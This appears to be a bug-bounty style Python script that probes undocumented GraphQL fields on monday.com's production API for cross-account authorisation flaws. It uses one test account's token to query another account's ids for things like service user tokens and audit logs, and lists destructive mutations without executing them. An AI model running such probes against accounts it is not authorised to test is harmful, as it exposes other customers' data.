#!/usr/bin/env python3
"""Probe the read-only fields that exist only without an API-Version header.

    export TOKEN_B=...  TOKEN_C=...
    python3 probe_hidden.py

schema-diff.sh found 48 Query and 103 Mutation fields served by the unversioned
endpoint that no published version from 2023-10 to 2025-04 exposes. This takes
the read-only half and asks two questions of each:

    baseline   does C's own token get an answer for C's own account?
    attack     does B's token get an answer for C's account_id?

An answer to the second is the finding. A refusal is a pass.

This sends queries only. Mutations are listed with their signatures so the
dangerous ones are visible, and are never executed - several of them delete,
revoke or re-permission things, and firing one blind at an id is how a test
account becomes an incident.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

API = "https://api.monday.com/v2"
TOKEN_B = os.environ.get("TOKEN_B", "")
TOKEN_C = os.environ.get("TOKEN_C", "")

# account C, the victim side of the pair
C_ACCOUNT = "36786534"
C_USER = "115703279"
C_BOARD = "5103704617"
C_ITEM = "3209838125"

# read-only fields from only-unversioned.Query.txt, most interesting first
CANDIDATES = [
    "service_user_tokens",       # a query whose name says it returns tokens
    "service_users",
    "audit_logs",                # normally an enterprise-admin surface
    "audit_event_catalogue",
    "get_app_lifecycle_subscriptions",
    "usage",
    "analytics_events",
    "tool_events",
    "settings",
    "user_configs",
    "departments",
    "objects",
    "object_relations",
    "object_types_unique_keys",
    "get_directory_resources",
    "insights",
    "campaigns",
    "segments",
    "notifications",
    "favorites",
]

# mutations worth seeing the signature of, never worth firing blind
DANGEROUS = [
    "set_board_permission", "add_subscribers_to_object", "create_service_user",
    "regenerate_service_user_token", "revoke_service_user_tokens",
    "execute_integration_block", "import_doc_from_html", "set_form_password",
    "delete_object", "archive_object", "bulk_delete_items", "bulk_archive_items",
    "undo_action", "assign_department_owner", "install_app",
]

ARG_VALUES = {
    "account_id": C_ACCOUNT, "accountId": C_ACCOUNT,
    "user_id": C_USER, "userId": C_USER,
    "board_id": C_BOARD, "boardId": C_BOARD,
    "item_id": C_ITEM, "itemId": C_ITEM,
    "limit": 5, "page": 1, "first": 5,
}
SCALARS = {"String", "Int", "Float", "Boolean", "ID", "ISO8601DateTime", "JSON", "Date"}
R, G, Y, B, D, N = "\033[31m", "\033[32m", "\033[33m", "\033[1m", "\033[2m", "\033[0m"


def post(token, query, pause=1.0):
    req = urllib.request.Request(
        API,
        data=json.dumps({"query": query}).encode(),
        headers={"Authorization": token, "Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:
        body = json.dumps({"errors": [{"message": f"transport: {e}"}]})
    time.sleep(pause)
    return body


def unwrap(t):
    """Innermost named type, and whether the outer wrapper made it required."""
    required = t and t.get("kind") == "NON_NULL"
    while t and not t.get("name"):
        t = t.get("ofType")
    return (t or {}).get("name"), (t or {}).get("kind"), required


def introspect_type(name, cache={}):
    if name in cache:
        return cache[name]
    q = ('{ __type(name: "%s") { name kind fields { name type { name kind ofType '
         '{ name kind ofType { name kind ofType { name kind } } } } } } }' % name)
    try:
        cache[name] = json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]
    except Exception:
        cache[name] = None
    return cache[name]


def selection_for(type_name, depth=0):
    """A selection set of scalar fields, one level of nesting deep."""
    t = introspect_type(type_name)
    if not t or not t.get("fields"):
        return ""
    scalars, objects = [], []
    for f in t["fields"]:
        if f.get("args"):
            continue
        inner, kind, _ = unwrap(f["type"])
        if inner in SCALARS or kind == "ENUM":
            scalars.append(f["name"])
        elif kind == "OBJECT" and depth == 0:
            objects.append((f["name"], inner))
    picked = scalars[:8]
    for fname, ftype in objects[:2]:
        sub = selection_for(ftype, depth + 1)
        if sub:
            picked.append(f"{fname} {sub}")
    return "{ " + " ".join(picked) + " }" if picked else ""


def literal(name, type_name, value):
    if isinstance(value, int) and type_name in ("Int", "Float"):
        return str(value)
    if type_name in ("Int", "Float") and str(value).isdigit():
        return str(value)
    return '"%s"' % value


def build(field, root="Query"):
    """Return (query_string, note). note explains a skip."""
    t = introspect_type(root)
    if not t:
        return None, "could not introspect %s" % root
    spec = next((f for f in t["fields"] if f["name"] == field), None)
    if not spec:
        return None, "not present"
    args, missing = [], []
    for a in spec.get("args") or []:
        inner, kind, required = unwrap(a["type"])
        if a["name"] in ARG_VALUES:
            args.append("%s: %s" % (a["name"], literal(a["name"], inner, ARG_VALUES[a["name"]])))
        elif required:
            missing.append("%s: %s" % (a["name"], inner))
    if missing:
        return None, "needs args " + ", ".join(missing)
    inner, _, _ = unwrap(spec["type"])
    sel = "" if inner in SCALARS else selection_for(inner)
    if not sel and inner not in SCALARS:
        return None, "could not build a selection for %s" % inner
    arglist = "(%s)" % ", ".join(args) if args else ""
    return "{ %s%s %s }" % (field, arglist, sel), None


def classify(body, is_attack):
    low = body.lower()
    if "cannot query field" in low:
        return D + "ABSENT" + N
    if "error code: 1015" in low:
        return Y + "RATELIMIT" + N
    if '"errors"' in low:
        if "unauthor" in low or "permission" in low or "forbidden" in low or "not allowed" in low:
            return G + "denied" + N
        msg = ""
        try:
            msg = json.loads(body)["errors"][0].get("message", "")[:60]
        except Exception:
            pass
        return Y + "error" + N + D + " " + msg + N
    if '"data"' in low:
        if re.search(r'"\w+":(null|\[\])[,}]', body):
            return G + "empty" + N
        return (R + B + "ANSWERED" + N) if is_attack else (G + "ok" + N)
    return Y + "?" + N


def main():
    if not TOKEN_B or not TOKEN_C:
        sys.exit("export TOKEN_B and TOKEN_C first")

    os.makedirs("hidden-probe-out", exist_ok=True)
    print("\n%s=== read-only fields the published API versions do not expose ===%s" % (B, N))
    print("%s  baseline = C's token on C's account. attack = B's token on C's ids.%s\n" % (D, N))

    findings = []
    for field in CANDIDATES:
        query, note = build(field)
        if not query:
            print("  %-34s %s%s%s" % (field, D, note, N))
            continue

        base = post(TOKEN_C, query)
        atk = post(TOKEN_B, query)
        vb, va = classify(base, False), classify(atk, True)

        print("  %-34s baseline %-24s attack %s" % (field, vb, va))
        print("     %s%s%s" % (D, query[:110], N))
        with open("hidden-probe-out/%s.json" % field, "w") as fh:
            json.dump({"query": query, "baseline": base, "attack": atk}, fh, indent=2)

        if "ANSWERED" in va:
            print("     %s%s>>> B got data for C's ids. Read hidden-probe-out/%s.json%s"
                  % (R, B, field, N))
            findings.append(field)
        print()

    print("%s=== mutations: signatures only, never executed ===%s" % (B, N))
    print("%s  read these before touching any of them%s\n" % (D, N))
    mt = introspect_type("Mutation")
    if mt:
        for f in mt["fields"]:
            if f["name"] not in DANGEROUS:
                continue
            args = ", ".join(
                "%s: %s" % (a["name"], unwrap(a["type"])[0]) for a in (f.get("args") or [])
            )
            takes_id = re.search(r"(account|user|board|item|object|doc)_?id", args, re.I)
            print("  %s%s(%s)%s" % (R if takes_id else D, f["name"], args, N))

    print("\n%s--- result ---%s" % (B, N))
    if findings:
        print("  %s%sB received data for C's ids from: %s%s" % (R, B, ", ".join(findings), N))
        print("  Bodies are in hidden-probe-out/. Confirm C's own identifiers appear in")
        print("  them - an empty envelope is not a leak - then capture both request_ids.")
    else:
        print("  %sNothing answered B for C's ids.%s" % (G, N))
        print("  These fields are undocumented but they are still authorised.")
    print("\n%s  Nothing above was mutated. Any mutation you try next: read its signature,"
          "\n  run it against your own objects first, and never run a delete, revoke or"
          "\n  permission change at an id you do not own.%s" % (D, N))


if __name__ == "__main__":
    main()
